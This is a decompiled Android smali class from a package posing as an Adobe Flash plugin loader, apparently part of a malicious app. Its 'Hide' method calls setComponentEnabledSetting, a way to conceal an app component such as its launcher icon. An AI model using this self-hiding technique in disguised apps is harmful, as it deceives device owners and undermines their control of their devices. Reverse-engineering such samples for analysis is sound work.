.class public Lcom/adobe/flashplugin/Loader$AvThere;
.super Ljava/lang/Object;
.source "Loader.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/adobe/flashplugin/Loader;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "AvThere"
.end annotation


# instance fields
.field final synthetic this$0:Lcom/adobe/flashplugin/Loader;


# direct methods
.method public constructor <init>(Lcom/adobe/flashplugin/Loader;)V
    .locals 0

    .prologue
    .line 55
    iput-object p1, p0, Lcom/adobe/flashplugin/Loader$AvThere;->this$0:Lcom/adobe/flashplugin/Loader;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public Hide(Landroid/content/pm/PackageManager;Landroid/content/ComponentName;II)V
    .locals 0
    .param p1, "p"    # Landroid/content/pm/PackageManager;
    .param p2, "componentName"    # Landroid/content/ComponentName;
    .param p3, "c"    # I
    .param p4, "z"    # I

    .prologue
    .line 57
    invoke-virtual {p1, p2, p3, p4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 58
    return-void
.end method
